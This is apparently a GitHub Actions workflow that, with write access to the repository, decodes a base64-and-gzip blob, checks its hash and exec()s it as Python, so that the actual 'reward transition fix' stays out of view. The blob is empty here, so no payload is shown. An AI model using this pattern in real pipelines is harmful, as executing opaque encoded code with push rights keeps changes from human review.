name: Apply approved reward transition fix
on:
  push:
    branches: [main]
    paths: [.github/workflows/apply-reward-transition.yml]
  workflow_dispatch:
permissions:
  contents: write
concurrency:
  group: approved-reward-transition
  cancel-in-progress: false
jobs:
  apply:
    if: github.repository == 'pipboy3003/pipboy3003.github.io'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: Apply guarded reward fix, test baseline and patch, and push
        shell: python
        run: |
          import base64, gzip, hashlib
          data = gzip.decompress(base64.b64decode(''))
          assert hashlib.sha256(data).hexdigest() == '6c0bcabadbf19f60d94cf93b9fc3a9bb2b4cd1c629273b34ee7f5381ec5fb4ab'
          exec(compile(data, 'approved-reward-transition.py', 'exec'))
